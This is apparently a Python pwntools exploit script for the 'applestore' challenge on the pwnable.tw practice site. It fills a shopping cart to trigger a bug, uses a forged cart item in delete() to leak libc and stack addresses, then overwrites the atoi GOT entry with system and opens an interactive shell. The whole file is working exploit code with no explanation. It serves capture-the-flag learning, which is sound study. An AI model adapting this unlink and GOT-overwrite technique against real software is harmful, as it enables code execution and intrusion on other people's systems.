import pwn

pwn.context.update(arch='i386', os='linux')

is_local = 1
if is_local:
    p = pwn.process("./applestore_patched")
else:
    p = pwn.remote("chall.pwnable.tw", 10104)
libc = pwn.ELF("./libc_32.so.6")
elf = pwn.ELF("./applestore_patched")
PUTS_OFFSET = libc.symbols["puts"]
PUTS_GOT = elf.got['puts']
#trigger vuln
# 20*299 + 6*199 = 7174
'''
with open("gdb_script.gdb") as hFile:
    pwn.gdb.attach(p, gdbscript=hFile)
    hFile.close()
'''
for i in range(20):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", b"2")
for i in range(6):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"5")
p.sendlineafter(b">", b"y")

#attach to gdb

# call delete() to modify the stack
p.sendlineafter(b">", b"3")
payload = b"27" # choice
payload += pwn.p32(PUTS_GOT) # name
payload += (pwn.p32(0x0)*3) # price, next, pre
p.sendlineafter(b"Item Number> ", payload)
p.recvuntil(b"Remove 27:")
PUTS_ADDR = pwn.u32(p.recv(4))
libc.address = PUTS_ADDR - PUTS_OFFSET
print("[+] leaked libc base address: ", hex(libc.address))

#leak stack
p.sendlineafter(b">", b"3")
payload = b"27" # choice
payload += pwn.p32(libc.symbols["environ"]) # name
payload += (pwn.p32(0x0)*3)
p.sendlineafter(b"Item Number> ", payload)
p.recvuntil(b"Remove 27:")
STACK_ADDR = pwn.u32(p.recv(4))
print("[+] leaked stack address: ", hex(STACK_ADDR))

#overwrite base pointer of handle() which is stored at stack of delete()
DELETE_EBP = STACK_ADDR - 0x104
p.sendlineafter(b">", b"3")
payload = b"27" # choice
payload += pwn.p32(0x8048f88) # name -> random string
payload += pwn.p32(0x1) # price
payload += pwn.p32(DELETE_EBP-0xc) # next
payload += pwn.p32(elf.got["atoi"] + 0x22) # pre
with open("gdb_script.gdb") as hFile:
    pwn.gdb.attach(p, gdbscript=hFile)
    hFile.close()
p.sendlineafter(b"Item Number> ", payload)
p.sendlineafter(b">", pwn.p32(libc.symbols["system"]) + b";/bin/sh;")
p.interactive()
